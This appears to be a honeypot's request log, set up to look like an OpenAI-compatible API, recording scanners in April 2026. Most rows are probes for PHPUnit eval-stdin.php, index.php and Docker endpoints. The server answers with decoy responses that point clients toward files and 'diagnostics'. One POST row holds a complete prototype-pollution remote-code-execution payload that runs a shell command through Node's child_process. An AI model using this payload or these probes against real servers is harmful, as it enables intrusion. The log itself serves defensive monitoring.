b848832f-defa-4e3d-b63b-f3d3bdaf8744,2026-04-09T21:49:12.066866+00:00,anon_e23631ed,GET,/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9da4a85f-fe80-4882-b422-d98662dc55be,2026-04-09T21:49:12.437135+00:00,anon_e23631ed,GET,/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
dfea6263-fbb8-4225-9da0-13a423d8379a,2026-04-09T21:49:12.802906+00:00,anon_e23631ed,GET,/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
85082ba0-0bcc-49e3-b257-b506b07c4ae2,2026-04-09T21:49:13.178579+00:00,anon_e23631ed,GET,/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e965521a-e65c-4f92-b949-7482f2541c70,2026-04-09T21:49:13.580260+00:00,anon_e23631ed,GET,/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
fdca3368-8060-4b73-babe-e99e5c8dfbd5,2026-04-09T21:49:13.959068+00:00,anon_e23631ed,GET,/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5a0ccff0-6e26-42a5-858d-376b2c9852ba,2026-04-09T21:49:14.339494+00:00,anon_e23631ed,GET,/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a05a67ba-8e96-4c30-bbc7-f00e7e3a3bf1,2026-04-09T21:49:14.786414+00:00,anon_e23631ed,GET,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b22491ae-c229-4d3f-addb-dfd11e31f287,2026-04-09T21:49:15.227145+00:00,anon_e23631ed,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d834bbc2-07eb-4b4b-84f3-3608e3fa0a70,2026-04-09T21:49:15.649483+00:00,anon_e23631ed,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c264ec14-2cce-4514-8066-b73196e3e4d1,2026-04-09T21:49:16.074219+00:00,anon_e23631ed,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b7e74845-0984-423e-a291-91629a70daf7,2026-04-09T21:49:16.553888+00:00,anon_e23631ed,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f06a2f27-945f-4698-b865-46b67504928b,2026-04-09T21:49:16.943314+00:00,anon_e23631ed,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f6d28896-5aec-45ce-8a6e-63c35319e0cc,2026-04-09T21:49:17.309684+00:00,anon_e23631ed,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e02cfcea-e75b-4875-b6dc-910740b874e7,2026-04-09T21:49:17.680871+00:00,anon_e23631ed,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c3921506-33d8-4dd7-9e81-dbd8c7443389,2026-04-09T21:49:18.064777+00:00,anon_e23631ed,GET,/public/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d0608389-033e-4496-b3dc-3d12e695a4d7,2026-04-09T21:49:18.415923+00:00,anon_e23631ed,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5f003a0e-a529-4850-b5ab-3d97df6bc70f,2026-04-09T21:49:18.772227+00:00,anon_e23631ed,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f6652608-e1d1-4a21-8b09-f4a60a7c1c20,2026-04-09T21:49:19.138595+00:00,anon_e23631ed,GET,/containers/json,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
efe71182-0118-4b1b-b780-a85e1341911e,2026-04-09T22:37:06.722062+00:00,anon_b7b382f8,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",1,
805bbb94-6ad8-4ef4-94ff-7076a27ecd2b,2026-04-09T22:37:15.549051+00:00,anon_b7b382f8,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
2e54c2c2-973c-4688-9e71-a1cdf7788649,2026-04-09T22:44:14.482933+00:00,anon_4b902154,GET,/login,[honeypot-host],Go-http-client/1.1,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0434bd13-8fe5-4097-92c6-3354e2485d1b,2026-04-09T22:52:39.385097+00:00,anon_920b02bf,GET,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
368c4a4c-c85c-41e5-bf09-b62d2c4935d4,2026-04-09T23:01:29.047330+00:00,anon_77d1c59b,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
f68dda43-57a1-4bc0-8f6d-b8d7b84819d0,2026-04-09T23:35:23.071084+00:00,anon_640de9e1,GET,/,,"Mozilla/5.0 (Linux; Android 7.0; SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
7e381888-7876-4e95-a1b9-e6f3afc347b0,2026-04-10T00:55:52.624264+00:00,anon_7dcf56fb,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
0aa8c08c-970e-4179-8e4b-76c136fc2af9,2026-04-10T00:56:39.888066+00:00,anon_fa616b73,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
590218a0-1714-4295-8c33-17cd8a05e34a,2026-04-10T01:33:22.978431+00:00,anon_a79efdbe,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8003306e-1f52-4d34-92e2-b876cddb9241,2026-04-10T01:49:25.021795+00:00,anon_98225a14,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
a319f9c7-bdff-4e32-845c-99b252d7af1f,2026-04-10T01:49:25.312359+00:00,anon_98225a14,POST,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",,690,316,1,,"------WebKitFormBoundarycca045d87bb61139
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B1337\""}"",""_response"":{""_prefix"":""var res=process.mainModule.require('child_process').execSync('pwd').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"",""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundarycca045d87bb61139
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundarycca045d87bb61139
Content-Disposition: form-data; name=""2""

[]
------WebKitFormBoundarycca045d87bb61139--","------WebKitFormBoundarycca045d87bb61139
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B1337\""}"",""_response"":{""_prefix"":""var res=process.mainModule.require('child_process').execSync('pwd').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"",""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundarycca045d87bb61139
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundarycca045d87bb61139
Content-Disposition: form-data; name=""2""

[]
------WebKitFormBoundarycca045d87bb61139--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
42a57ded-6f8a-4826-a050-8754344e58a9,2026-04-10T01:52:35.368068+00:00,anon_12b60224,GET,/ping.cgi,,r00ts3c,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
